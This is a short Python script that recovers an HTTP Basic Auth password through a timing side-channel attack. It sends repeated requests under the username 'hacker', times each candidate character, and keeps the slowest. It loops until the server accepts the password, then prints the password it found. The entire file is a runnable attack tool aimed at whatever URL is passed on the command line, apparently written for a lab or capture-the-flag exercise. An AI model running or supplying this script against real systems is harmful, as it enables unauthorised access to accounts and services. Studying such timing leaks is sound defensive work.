import sys
import string
import time
import requests
from requests.auth import HTTPBasicAuth


def run_test(payload, url):
    resp = requests.get(url,auth=HTTPBasicAuth('hacker',payload))
    return resp


def check_char(known_chars, url):
    """
    Performs a test with the previously derived known characters joined with
    one of the alphanumeric characters at a time
    :param known_chars: A string containing the correct password characters
    already found so far.
    :param url: The website for the basic auth test
    :return: the list of known characters with a new correct character
    attached.
    """
    if known_chars:
        test_load = known_chars  #test_load the test string for comparison
    else:
        test_load = ""
    longest_time = [0, '']
    sample_range = string.ascii_letters + string.digits
    for test_char in sample_range:
        ##TODO Need to build a sorted list for final comparison
        load = test_load + test_char
        print("The current character is %s" % load)
        pre_time = time.time()
        run_test(load, url)
        total_time = [time.time() - pre_time, test_char]
        if total_time[0] > longest_time[0]:
            longest_time = total_time
            print("New longest time of %f for character %s" % (total_time[0],test_char))
        else:
            print("The current character's time of %f is %f less than longest" % (total_time[0], (longest_time[0]-total_time[0])))
        print("The current likely character is %s" % longest_time[1])
    return known_chars + longest_time[1]


def main():
    # Command line argument exception handling
    if len(sys.argv) < 2:
        print("You failed to provide a target URL on the command line!")
        sys.exit(1)  # abort because of error
    test_url = sys.argv[1]
    if (test_url[:7].lower() != "http://"):
        print("ERROR:: Expecting URL beginning with \'http://\' ")
        sys.exit(1)  # abort because of error
    print("Target site = %s" % test_url)

    known_chars = ""

    while run_test(known_chars, test_url).status_code == 401:
        known_chars = check_char(known_chars, test_url)

    print("The password is %s" % known_chars)

if __name__ == '__main__':
    main()